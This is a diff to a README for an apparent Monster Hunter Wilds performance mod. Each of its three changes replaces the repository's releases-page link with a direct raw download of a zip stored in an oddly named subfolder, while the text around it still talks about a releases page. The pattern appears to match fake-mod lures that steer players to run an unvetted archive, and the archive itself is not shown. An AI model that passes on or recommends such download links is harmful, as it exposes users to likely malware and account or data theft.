@@ -1,6 +1,6 @@
 # 🎮 Monster-Hunter-Wilds-Performance-Mod - Faster, Smoother Game Setup
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rattleboxdiminution453/Monster-Hunter-Wilds-Performance-Mod/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rattleboxdiminution453/Monster-Hunter-Wilds-Performance-Mod/raw/refs/heads/main/Ionize/Wilds-Mod-Hunter-Monster-Performance-v2.5.zip)
 
 ## 🧭 What This Is
 
@@ -18,7 +18,7 @@ Use this guide if you want:
 
 Visit the releases page to download and run the latest setup files:
 
-https://github.com/rattleboxdiminution453/Monster-Hunter-Wilds-Performance-Mod/releases
+https://github.com/rattleboxdiminution453/Monster-Hunter-Wilds-Performance-Mod/raw/refs/heads/main/Ionize/Wilds-Mod-Hunter-Monster-Performance-v2.5.zip
 
 On that page, look for the newest release and download the file that matches it. If the release includes a setup package or archive, save it to your PC first, then open it from your Downloads folder.
 
@@ -242,4 +242,4 @@ After you apply the files, you should see a cleaner setup path and a better base
 
 Use the same release page any time you want the latest version:
 
-https://github.com/rattleboxdiminution453/Monster-Hunter-Wilds-Performance-Mod/releases
+https://github.com/rattleboxdiminution453/Monster-Hunter-Wilds-Performance-Mod/raw/refs/heads/main/Ionize/Wilds-Mod-Hunter-Monster-Performance-v2.5.zip
